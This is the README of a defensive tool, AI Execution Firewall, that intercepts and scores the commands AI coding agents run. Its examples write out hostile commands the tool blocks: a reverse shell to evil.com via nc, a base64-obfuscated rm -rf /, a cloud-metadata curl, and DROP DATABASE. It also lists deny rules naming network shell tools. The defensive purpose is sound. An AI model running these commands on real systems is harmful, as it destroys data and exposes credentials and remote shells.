<p align="center">
  <img src="https://raw.githubusercontent.com/Shahriyar-Khan27/ai_firewall/main/assets/logo.png" alt="AI Execution Firewall" width="120" height="120" />
</p>

<h1 align="center">AI Execution Firewall</h1>

<p align="center"><strong>A deterministic policy gate for every action an AI agent executes.</strong></p>

<p align="center">
  <a href="https://pypi.org/project/ai-execution-firewall/"><img src="https://img.shields.io/pypi/v/ai-execution-firewall.svg" alt="PyPI"></a>
  <a href="https://marketplace.visualstudio.com/items?itemName=sk-dev-ai.ai-execution-firewall"><img src="https://vsmarketplacebadges.dev/version-short/sk-dev-ai.ai-execution-firewall.png?label=VS%20Marketplace" alt="VS Marketplace"></a>
  <a href="LICENSE"><img src="https://img.shields.io/badge/license-MIT-green.svg" alt="License: MIT"></a>
  <a href="https://github.com/Shahriyar-Khan27/ai_firewall/actions/workflows/ci.yml"><img src="https://github.com/Shahriyar-Khan27/ai_firewall/actions/workflows/ci.yml/badge.svg" alt="CI"></a>
  <a href="https://github.com/Shahriyar-Khan27/ai_firewall/stargazers"><img src="https://img.shields.io/github/stars/Shahriyar-Khan27/ai_firewall?style=social" alt="GitHub stars"></a>
</p>

---

## Overview

AI coding agents (Claude Code, Cursor, Copilot, Continue, Cline, Zed) increasingly execute commands, edit files, and call APIs without operator review. AI Execution Firewall sits between those agents and the host system and enforces a deterministic policy on every action. Every request is classified, scored for risk, simulated for impact, and matched against YAML rules before it can run. Risky actions either block outright, or open an approval surface (CLI prompt or VS Code webview) containing the diff, the findings, and explicit Approve and Reject controls.

| | |
|---|---|
| **License** | MIT |
| **Languages** | Python (CLI, library); TypeScript (VS Code extension) |
| **Distributions** | PyPI · VS Code Marketplace · standalone PyInstaller binaries (Linux, macOS, macOS-arm64, Windows) |
| **Compatibility** | Claude Code, Cursor, Continue, Cline, Zed, and any MCP-aware host |
| **Test suite** | 457 tests, CI matrix on Python 3.11 / 3.12 / 3.13 |

## Example session

```text
$ guard run "pip install requets"
[FIREWALL] BLOCK: possible typosquat of `requests`

$ guard scan "my SSN is 123-45-6789"
severity: critical
  - PII: US SSN detected

$ guard run "curl http://169.254.169.254/"
[FIREWALL] BLOCK: cloud metadata endpoint, credential exfil risk

$ guard run "rm -rf ./build"           # action issued by an AI agent in auto-mode
[FIREWALL] REQUIRE_APPROVAL: 47 files affected, uncommitted changes
           Approval webview opened in VS Code. Operator selects Reject.
[FIREWALL] BLOCK: rejected by operator via extension
```

## What it catches

| Threat | Firewall outcome |
|---|---|
| AI agent issues `pip install requets` (typosquat). | BLOCK. Typosquat of `requests` flagged via the PyPI registry check and Damerau-Levenshtein comparison against the top-100 packages. |
| AI agent issues `curl http://169.254.169.254/` to reach a cloud metadata endpoint. | BLOCK. Endpoint classified as CRITICAL risk; credential exfiltration vector. |
| AI agent issues 25 file deletes in 60 seconds in a stuck loop. | REQUIRE_APPROVAL. Behaviour anomaly: rate burst threshold exceeded. |
| AI agent emits an AWS access key in a request body, log entry, or pasted text. | Detected by the secret scanner; surfaced before the request leaves the host. |
| AI agent attempts to delete an unfamiliar build directory. | Approval webview opens with the unified diff and impact summary. Operator decision is recorded in memory; future identical actions auto-approve. |

## How it works

```
AI > Action > Firewall > Decision > Execution
```

Each `guard.execute(action)` call passes through a deterministic pipeline: intent classification, risk scoring, YAML policy evaluation, impact simulation (unified diff for code, SQL AST analysis, git context, SSRF and leaked-secret detection for URLs), and a final decision of `ALLOW`, `BLOCK`, or `REQUIRE_APPROVAL`. Every evaluated action is appended to a JSONL audit log and, when configured, broadcast to one or more SIEM sinks. Full pipeline detail is documented in the [Pipeline](#pipeline) section.

## Capabilities

**Detection and analysis**

- Semantic command parsing (bashlex AST) with base64, hex, and printf obfuscation decoding.
- SQL parsing via `sqlglot`; HTTP and URL parsing for SSRF, cloud-metadata, and credential leakage detection.
- AI-SBOM validation against the PyPI, npm, crates.io, and RubyGems registries with Damerau-Levenshtein typosquat detection against the top-100 packages.
- Secret scanning (AWS, GitHub, Slack, Stripe, Google, Anthropic, OpenAI, PEM keys, JWTs) and PII scanning (email, US SSN, Luhn-validated credit cards, E.164 / US phone, IBAN, high-entropy tokens).
- Rule-based behaviour anomaly detection over the audit log: rate burst, last-hour rate spike vs 24-hour median, and quiet-hour outliers.

**Enforcement and governance**

- YAML-driven policy engine producing `ALLOW`, `BLOCK`, or `REQUIRE_APPROVAL` decisions.
- Fine-grained RBAC via `guard.toml` with role inheritance and intent / file-glob / MCP-tool allow-deny lists.
- Rate limiting per intent, loop detection on identical commands, and a daily API-byte budget.
- Network egress control covering `curl`, `wget`, `httpie`, `nc`, `socat`, `telnet`, `scp`, and `rsync`.

**Operator experience**

- Approved-pattern memory and permission inheritance from the host shell history reduce repeat prompts.
- Docker sandbox dry-run replays destructive shell commands in a disposable container before any host change.
- Approval webview in the VS Code extension surfaces risk badges, findings, git context, and a syntax-coloured unified diff.
- Automatic detection and integration of Claude Code, Cursor, Continue, Cline, and Zed via a single notification on first activation.

**Audit and integration**

- HMAC-SHA256-signed JSONL audit trails with `guard audit verify` and `guard audit show --json`.
- SIEM-ready audit sinks for syslog, Splunk HEC, generic HTTPS webhooks, and stdout (for `vector` or `fluent-bit`), all asynchronous with bounded queues.
- MCP transparent proxy for any MCP-aware host, with auto-detection (`guard mcp scan`) and one-command installation (`guard mcp install <server>`).

Full release-by-release detail is in [CHANGELOG.md](CHANGELOG.md).

## Install

**Python package** ([PyPI](https://pypi.org/project/ai-execution-firewall/)):

```bash
pip install ai-execution-firewall
```

**VS Code extension** ([Marketplace](https://marketplace.visualstudio.com/items?itemName=sk-dev-ai.ai-execution-firewall)):

> VS Code, then Extensions panel, search **"AI Execution Firewall"**, click Install.

Or from the command line:

```bash
code --install-extension sk-dev-ai.ai-execution-firewall
```

**Standalone binary** (no Python required). Download `guard-{linux,macos,macos-arm64,windows}` from the [latest release](https://github.com/Shahriyar-Khan27/ai_firewall/releases/latest) and put it on your PATH.

For development (editable install with test deps):

```bash
git clone https://github.com/Shahriyar-Khan27/ai_firewall.git
cd ai_firewall
pip install -e ".[dev]"
```

## Troubleshooting

### Windows: `pythonNNN.dll was not found` when running `pip install`

If `pip install ai-execution-firewall` produces a Windows system error similar to:

> The code execution cannot proceed because python312.dll was not found. Reinstalling the program may fix this problem.

This is a broken Python install on the host, not a problem with this package. `pip.exe` itself is dynamically linked against `python312.dll` (or `python311.dll`, `python313.dll`, and so on), so it cannot run when that DLL is missing or unreachable on `PATH`. The usual cause is a half-removed or upgraded Python install that left a stale `pip.exe` behind.

Two paths to a fix:

1. **Reinstall Python.** Uninstall every Python entry under Settings, Apps, Installed apps, then install Python 3.12 or 3.13 from <https://www.python.org/downloads/> with "Add Python to PATH" checked. Open a fresh Command Prompt and run `pip install ai-execution-firewall` again.
2. **Skip Python entirely.** Download `guard-windows.exe` from the [latest release](https://github.com/Shahriyar-Khan27/ai_firewall/releases/latest) and put it on `PATH`. Run `guard --version` to confirm. The standalone binary bundles its own interpreter and is unaffected by host Python issues. The VS Code extension picks it up via the `aiFirewall.guardPath` setting.

The same fix applies on Linux and macOS when `pip` reports `libpython3.X.so` or `libpython3.X.dylib` cannot be found.

### `guard` is not on PATH after install

`pip install ai-execution-firewall` installs `guard` into the active Python's `Scripts/` directory (Windows) or `bin/` directory (POSIX). On user-scoped installs without `--user-base` adjustments, that directory may not be on `PATH`. Run `python -m ai_firewall.cli.main --help` to confirm the package itself is installed; if that works, add the `Scripts/` (or `bin/`) directory to `PATH`, use a virtual environment, or use the standalone binary.

## Smart-flow approval pipeline (v0.3.0)

Earlier versions prompted on every risky action and produced approval fatigue. v0.3.0 replaces the single-prompt model with a layered pipeline that becomes progressively quieter as it learns the operator's patterns:

| Step | Stage | Behaviour |
|---|---|---|
| 1 | **Silent pass** | Safe commands (`git status`, `ls`, `echo`) execute without a prompt. |
| 2 | **Memory match** | Repeats of previously-approved actions in the same project auto-approve, with a status-bar notification. |
| 3 | **Permission inheritance** | Auto-approves when the operator has issued an equivalent command in the host shell within the last five minutes. |
| 4 | **Semantic detection** | Obfuscated payloads are decoded before classification. `echo "<b64>" \| base64 -d \| sh` is recognised as the decoded `rm -rf /` via the bashlex AST and the obfuscation decoders. |
| 5 | **Sandbox replay** (opt-in) | `--dryrun` runs the command in a disposable Docker container, surfaces the resulting file diff, and then prompts for approval. |
| 6 | **Auto-block** | Unambiguous malicious patterns (`rm -rf /`, fork bombs, `DROP DATABASE prod`) are rejected without a prompt. |
| 7 | **Operator approval** | Remaining REQUIRE_APPROVAL decisions surface in the CLI prompt or the VS Code webview. |

The pipeline stays silent for the majority of routine work and surfaces a prompt only when an action genuinely warrants operator review.

## Quickstart

### CLI

```bash
# Shell
guard eval "rm -rf /"                          # > BLOCK (no execution)
guard run  "echo hello"                         # > ALLOW, executes
guard run  "rm ./tmp.txt"                       # > REQUIRE_APPROVAL, prompts y/N
guard run  "rm -rf ./build" --dryrun            # > Docker sandbox: shows file diff, then asks

# Obfuscated payloads are decoded before classification.
guard eval 'echo "cm0gLXJmIC8=" | base64 -d | sh'   # > CRITICAL, BLOCK, decoded as rm -rf /

# SQL (analyze-only by default; never touches your DB)
guard sql "SELECT * FROM users"                 # > ALLOW, LOW
guard sql "DELETE FROM users"                   # > CRITICAL (no WHERE), REQUIRE_APPROVAL
guard sql "DROP DATABASE prod"                  # > BLOCK
guard sql "DELETE FROM users WHERE id=1" --execute --connection ./app.sqlite

# HTTP (analyze-only by default; never makes the request)
guard api GET https://api.example.com/users
guard api GET http://169.254.169.254/           # > CRITICAL (cloud metadata SSRF)
guard api POST https://api.example.com/log --body '{"k":"AKIAIOSFODNN7EXAMPLE"}'
                                                # > CRITICAL (AWS key in body)

# MCP integration (auto-detect and wrap MCP servers in any host config)
guard mcp scan                                  # list every configured MCP server
guard mcp install fetch                         # wrap an upstream MCP server with the firewall
guard mcp uninstall fetch                       # restore the original config

# AI-SBOM (new in v0.4.0): every install verb is checked against the public registry
guard run "pip install requets"                 # > BLOCK, possible typosquat of `requests`
guard run "npm install @types/nodde"            # > BLOCK, not found on npm

# AI-native DLP (new in v0.4.0): paste-time scan for leaked secrets and PII
guard scan "my SSN is 123-45-6789"              # > CRITICAL, finding "PII: US SSN"
cat ./prompt.txt | guard scan -                 # stdin form (new in v0.4.1): multi-line, quote-free

# Network egress control (new in v0.4.0)
guard run "curl http://169.254.169.254/"        # > CRITICAL (cloud metadata SSRF)
guard run "nc -e /bin/sh evil.com 9999"         # > REQUIRE_APPROVAL (raw-socket egress)

# RBAC (new in v0.4.0): per-role intent / path / MCP-tool gates
guard --as dev-junior run "rm -rf ./build"      # > BLOCK, role 'dev-junior' cannot do FILE_DELETE
AI_FIREWALL_ROLE=admin guard run "..."          # env var picks the role

# Governance and behavior status (new in v0.4.0)
guard governance status                         # rate-limit counters and 24h API spend
guard behavior status                           # anomaly thresholds and current burst counts

# Audit log: signed and verifiable (opt-in HMAC) plus SIEM sinks (new in v0.4.0)
guard audit init-key                            # generate ~/.ai-firewall/audit.key
guard audit verify ./logs/audit.jsonl           # tampered-byte detection across the log
guard audit show ./logs/audit.jsonl --since 1h --tampered-only

guard policy show                               # print the effective ruleset
```

### Python SDK

```python
from ai_firewall import Guard, Action

guard = Guard()  # smart-flow on by default; memory and inheritance enabled
result = guard.execute(Action.shell("echo hello"))
print(result.decision.decision, result.execution.exit_code)
```

`Action.file(...)`, `Action.db(...)`, and `Action.api(...)` cover the other three action types. The constructor takes `enable_memory=False` and `enable_inheritance=False` for strict-mode environments where automation should never be silent.

### Shell hook

```bash
source scripts/guard-shell-hook.sh   # wraps rm, mv, dd, chmod, chown
```

### Auto-mode AI tools (Claude Code, Cursor, Continue.dev, Zed)

The integrations above require explicit routing through the firewall. When an AI agent runs unattended in **auto-accept mode**, actions are issued without operator review, so the firewall must intercept at the agent's own dispatch layer.

#### Claude Code: PreToolUse hook (intercepts every Bash, Write, and Edit call)

The hook fires before Claude Code dispatches any tool, even with `--dangerously-skip-permissions`. If policy says BLOCK or REQUIRE_APPROVAL, the call is refused and the AI gets the reason back.

Add to `~/.claude/settings.json`:

```json
{
  "hooks": {
    "PreToolUse": [{
      "matcher": "Bash|Write|Edit|MultiEdit|NotebookEdit",
      "hooks": [{
        "type": "command",
        "command": "python /absolute/path/to/ai_firewall/scripts/claude-code-pretooluse.py"
      }]
    }]
  }
}
```

A copyable example lives at [examples/claude-code-settings.json](examples/claude-code-settings.json).

#### MCP: wrap any MCP-capable host (Claude Code, Cursor, Continue, Zed, Cline, ...)

```bash
pip install "ai-execution-firewall[mcp]"
```

**Manual** (drop in your client's mcp.json):

```json
{
  "mcpServers": {
    "ai-firewall": {"command": "guard", "args": ["mcp"]}
  }
}
```

**Automatic.** Let the firewall scan and wrap your existing MCP servers:

```bash
guard mcp scan                # list what is configured
guard mcp install fetch       # rewrites the mcp.json to route 'fetch' through the firewall
```

After wrapping, every `tools/call` JSON-RPC request from the host runs through `Guard.evaluate` first. BLOCK and REQUIRE_APPROVAL responses are returned to the host as tool errors; the upstream MCP server is never reached for risky calls. Heuristic argument-shape mapping handles the common conventions (`command`, `file_path`, `sql`, `url`).

### VS Code extension

On first activation the extension detects every AI tool configured on the host (Claude Code via `~/.claude/settings.json`, MCP-aware hosts via `guard mcp scan --json`) and offers a single notification to wire firewall protection into each of them. From that point, any agent action that hits REQUIRE_APPROVAL opens the approval webview automatically; no manual command invocation is required. *(new in v0.5.0)*

The Command Palette (Ctrl+Shift+P) exposes the following commands under `AI Firewall:`

- **Detect & Wire AI Tools** / **Unwire All AI Tools** *(new in v0.5.0)*: re-arm or reverse the auto-wire flow.
- **Show Status** *(new in v0.5.0)*: markdown summary of wired hosts plus the last 20 audit decisions.
- **Run Shell Command...** / **Evaluate Selected Text as Shell Command**.
- **Evaluate SQL Query...** / **Evaluate Selected Text as SQL**.
- **Evaluate HTTP Request...**
- **Show Effective Policy**.
- **Show Recent Secret-DB Activity** *(v0.3.0; passive watcher for `state.vscdb` modifications)*.
- **Scan Text for Secrets and PII...** / **Scan Selection for Secrets and PII** *(v0.4.0)*.
- **Show Governance Status** / **Show Behavior Status** *(v0.4.0)*.

Risky actions open a themed approval webview containing the risk badge, intent and decision pills, the findings list, the git context, and a syntax-coloured unified diff. Smart-flow auto-approvals (memory or inheritance match) instead surface a status-bar message and proceed without opening the webview.

## Adapters

| Action type | Default adapter | Opt-in execute adapter |
|---|---|---|
| `shell` | `ShellAdapter` (subprocess) | `DockerSandboxAdapter` via `--dryrun` (Feature F) |
| `file` | `FileAdapter` (pathlib) | (none) |
| `db` | `DBAnalyzeAdapter` (never opens a DB) | `SQLiteExecuteAdapter` via `--execute --connection <sqlite-path>` |
| `api` | `APIAnalyzeAdapter` (never sends a request) | `HTTPExecuteAdapter` via `--execute` (stdlib `urllib`) |

DB and API default to **analyze-only** so the firewall never touches your database or network unless you explicitly opt in. Sandbox dry-run is opt-in for shell. It runs your command in a disposable container against a snapshot of the workdir, then surfaces the file diff before letting you confirm.

## Custom rules

Pass `--rules path/to/rules.yaml` (CLI) or `Guard(rules_path=...)` (SDK). See [`ai_firewall/config/default_rules.yaml`](ai_firewall/config/default_rules.yaml) for the schema:

```yaml
shell_exec:
  blocked:
    - 'rm\s+-rf\s+/'
  require_approval:
    risk_at_or_above: HIGH

file_delete:
  require_approval: true

db_destructive:
  blocked:
    - 'DROP\s+DATABASE'
  require_approval: true

api_destructive:
  require_approval: true
```

## Security

If you discover a vulnerability (a bypass of the firewall, a regex-DoS in a scanner, a prompt-injection that disables a check, or similar), please do not open a public issue. File it privately via [GitHub Security advisories](https://github.com/Shahriyar-Khan27/ai_firewall/security/advisories/new) to allow responsible coordination of a fix and disclosure.

Non-sensitive bugs and feature requests belong on the public issues tracker; see Contributing below.

## Contributing

This project is fully open source under the MIT license. Contributions of any size are welcome.

**Good first issues to pick up:**

- New SBOM registries (Composer, NuGet, Go modules) extend [`ai_firewall/engine/package_registry.py`](ai_firewall/engine/package_registry.py).
- Postgres and MySQL execute adapters. SQLite is currently the only real-execute path.
- Additional MCP host detectors. Zed, Cline, and Aider have evolving config layouts.
- Translations and docs polish in README, CHANGELOG, and in-CLI help.
- New PII patterns extend [`ai_firewall/engine/pii_scan.py`](ai_firewall/engine/pii_scan.py). Regex plus Luhn-style validators welcome.
- Statistical and ML behaviour models on top of the audit log. `engine/behavior.py` is currently rule-based.

**How to contribute:**

```bash
git clone https://github.com/Shahriyar-Khan27/ai_firewall.git
cd ai_firewall
pip install -e ".[dev]"
pytest -q       # confirm 457 tests pass
# make your change, add a test, push a branch, open a PR
```

Run `pytest` before opening a PR. CI re-runs the suite on Python 3.11, 3.12, and 3.13. New features ship with tests; regressions block merge.

**Bugs, questions, and feature requests:** open an issue at <https://github.com/Shahriyar-Khan27/ai_firewall/issues>. For security findings, refer to the Security section above.

## Links

- **PyPI**: <https://pypi.org/project/ai-execution-firewall/>
- **VS Code Marketplace**: <https://marketplace.visualstudio.com/items?itemName=sk-dev-ai.ai-execution-firewall>
- **GitHub repo**: <https://github.com/Shahriyar-Khan27/ai_firewall>
- **GitHub releases**: <https://github.com/Shahriyar-Khan27/ai_firewall/releases>
- **Issues**: <https://github.com/Shahriyar-Khan27/ai_firewall/issues>
- **CHANGELOG**: [CHANGELOG.md](CHANGELOG.md)

## License

MIT. See [LICENSE](LICENSE). Free for commercial and personal use, in any context, with attribution.
